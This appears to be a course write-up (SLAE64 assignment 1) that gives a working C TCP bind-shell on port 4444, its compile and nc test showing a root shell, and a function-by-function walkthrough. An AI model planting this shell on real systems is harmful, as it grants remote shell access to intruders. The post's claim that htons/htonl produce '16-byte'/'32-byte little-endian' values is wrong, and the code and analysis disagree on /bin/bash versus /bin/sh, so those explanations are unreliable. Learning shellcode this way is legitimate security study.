---
title: SLAE64 Assignment 1 - TCP Bind-Shell Shellcode
date: 2020-4-06
layout: single
classes: wide
tags:
  - Bind
  - Shell
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE32.png)


# Bindshell Analysis
## Bindshell.c
+ To better understand x64 shellcode, I first created a working bindshell in C.

### shellcode.c
```c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdlib.h>

int main(void)
{
  int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  struct sockaddr_in ipSocketAddr = { 
    .sin_family = AF_INET, 
    .sin_port = htons(4444), 
    .sin_addr.s_addr = htonl(INADDR_ANY) 
  };
  bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
  listen(ipv4Socket, 0);
  int clientSocket = accept(ipv4Socket, NULL, NULL);
  dup2(clientSocket, 0);
  dup2(clientSocket, 1);
  dup2(clientSocket, 2);
  execve("/bin/bash", NULL, NULL);
}
```
### Compile Shellcode
```bash
root# uname -orm
5.3.0-amd64 x86_64 GNU/Linux
root# gcc bindshell.c -o bindshell
```

### Test Shellcode
#### Terminal 1
```bash 
root# ./bindshell

```
#### Terminal 2
```bash
root# nc 127.0.0.1 4444
whoami
root

```


### Function Analysis
1. Create a new Socket.
```c 
int socket(int domain, int type, int protocol); 
```
  + `int domain   = AF_INET`
    - IPv4 Internet protocols.
  + `int type     = SOCK_STREAM`
    - Provides sequenced, reliable, two-way, connection-based byte streams (TCP).
  + `int protocol = IPPROTO_IP`
    - The protocol to be used with the socket.
    - When there is only one protocol option within the address family (like in this case), the value `0` is used. 
  + For complete details see: `man socket`
2. Create an IP Socket Address structure.
```c
 struct sockaddr_in {
               sa_family_t    sin_family; /* address family: AF_INET */
               in_port_t      sin_port;   /* port in network byte order */
               struct in_addr sin_addr;   /* internet address */
           };
           /* Internet address. */
           struct in_addr {
               uint32_t       s_addr;     /* address in network byte order */
           }; 
```
  + `sa_family_t sin_family  = AF_INET`
    - From Socket, we know that we will need to use the Address Family `AF_INET`
  + `in_port_t sin_port      = htons(4444)`
    - TCP Port 4444
    - The `htons()` function converts our decimal integer to 16-byte little-endian hex (aka "network byte order")
  + `struct in_addr sin_addr = htonl(INADDR_ANY)` 
    - All interfaces.
    - The `htonl()` function converts our decimal integer to 32-byte little-endian hex.
  + For complete details see: `man ip.7`
```
3. Bind the IP Socket Address to Socket. 
```c
int bind(int sockfd, const struct sockaddr \*addr, socklen\_t addrlen);`
```
  + `sockfd = ipv4Socket`
    - The socket file descriptor returned from `socket()` and saved as the variable `ipv4Socket`.
  + `const struct sockaddr *addr = &ipSocketAddr`
    - A pointer to the IP Socket Address structure `ipSocketAddr`.
  + `socklen_t addrlen = sizeof(ipSocketAddr)`
    - The byte length of our `ipSocketAddr` structure.
    - `sizeof()` returns the length in bytes of the variable.
  + For complete details see: `man bind`
4. Listen for connections to the TCP Socket at the IP Socket Address.
```c
int listen(int sockfd, int backlog);
```
  + `int sockfd  = ipv4Socket`
  + `int backlog = 0` 
    - This is for handling multiple connections. 
    - We only need to handle one connection at a time, therefor we will set this value to `0`. 
  + For complete details see: `man listen`
5. Accept connections to the TCP-IP Socket and create a Client Socket.
```c
int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
int clientSocket = accept(ipv4Socket, NULL, NULL);
```
  + `int sockfd = ipv4Socket`
  + `struct sockaddr *addr = NULL`
    - This structure is filled in with the address of the peer socket.
  + `socklen_t *addrlen = NULL`
    - When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.
  + `int flags  = NULL`
  + The function will return the new Socket File-Descriptor. Save as `clientSocket`
  + For complete details see: `man accept`
6. Transfer Standard-Input, Standard-Output, and Standard-Error to the client socket.
```c
int dup2(int oldfd, int newfd);
dup2(clientSocket, 0); // STDIN
dup2(clientSocket, 1); // STDOUT
dup2(clientSocket, 2); // STDERR
```
  + For complete details see: `man dup2`
7. Spawn a `/bin/sh` shell for the client, in the connected session.
```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
execve("/bin/sh", NULL, NULL);
```
  + `const char *pathname = "/bin/sh"`
  + `char *const argv[] = NULL`
  + `char *const envp[] = NULL`
  + For complete details see: `man execve`

